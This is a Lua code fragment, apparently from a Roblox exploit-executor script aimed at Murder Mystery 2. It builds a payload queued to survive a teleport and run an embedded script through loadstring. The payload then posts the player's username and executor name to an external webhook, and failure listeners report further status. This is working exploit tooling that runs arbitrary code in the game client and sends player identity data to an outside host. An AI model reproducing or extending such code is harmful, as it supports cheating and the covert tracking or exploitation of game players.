-- ====================== QUEUE PAYLOAD (sends V2) ======================
local function queueArrivalPayload()
    local escapedScript = SCRIPT_TO_RUN_ON_ARRIVAL
        :gsub("\\", "\\\\")
        :gsub('"', '\\"')
        :gsub("\r", "")
        :gsub("\n", "\\n")

    local payload = string.format([[
        if game.PlaceId ~= 142823291 then return end

        local HttpService = game:GetService("HttpService")
        local Players = game:GetService("Players")
        local LocalPlayer = Players.LocalPlayer

        -- Run arrival script
        pcall(function()
            loadstring("%s")()
        end)

        -- Send V2 Success
        local embed = {
            title = "V2 Successfully Teleported to MM2",
            color = 5763719,
            fields = {
                { name = "Game", value = "Murder Mystery 2 (MM2)", inline = true },
                { name = "Status", value = "✅ TELEPORTED", inline = true },
                { name = "Roblox Username", value = LocalPlayer.Name, inline = true },
                { name = "Detected Executor", value = "%s", inline = true },
                { name = "Destination", value = "Place ID: `142823291`", inline = false },
                { name = "Timestamp (UTC)", value = os.date("!%%Y-%%m-%%d %%H:%%M:%%S"), inline = true },
            },
            footer = { text = "Roblox Teleport System • V2" },
            timestamp = os.date("!%%Y-%%m-%%dT%%H:%%M:%%SZ")
        }

        local body = HttpService:JSONEncode({ embeds = { embed } })
        local headers = { ["Content-Type"] = "application/json" }
        local url = "%s"

        pcall(function()
            if syn and syn.request then
                syn.request({ Url = url, Method = "POST", Headers = headers, Body = body })
            elseif http_request then
                http_request({ Url = url, Method = "POST", Headers = headers, Body = body })
            elseif request then
                request({ Url = url, Method = "POST", Headers = headers, Body = body })
            else
                HttpService:PostAsync(url, body)
            end
        end)
    ]], escapedScript, getExecutorName(), SUCCESS_WEBHOOK_URL)

    local methods = {
        delta and delta.queue_on_teleport,
        delta and delta.queueonteleport,
        queue_on_teleport,
        queueonteleport,
        QueueOnTeleport,
        syn and syn.queue_on_teleport,
        fluxus and fluxus.queue_on_teleport,
        potassium and potassium.queue_on_teleport,
        getgenv and getgenv().queue_on_teleport,
    }

    for _, fn in pairs(methods) do
        if typeof(fn) == "function" then
            local ok = pcall(fn, payload)
            if ok then
                queuedSuccessfully = true
                print("[Queue] Successfully queued arrival payload")
                return true
            end
        end
    end

    print("[Queue] Failed to queue arrival payload")
    return false
end

-- ====================== FAILURE LISTENERS ======================
local function setupFailureListeners()
    if TeleportService.TeleportInitFailed then
        TeleportService.TeleportInitFailed:Connect(function(player, result, errorMsg)
            if player == LocalPlayer then
                sendV3Failed(tostring(result) .. " | " .. tostring(errorMsg))
            end
        end)
    end

    LocalPlayer.OnTeleport:Connect(function(state)
        if state == Enum.TeleportState.Failed then
            sendV3Failed("TeleportState.Failed")
        end
    end)
end

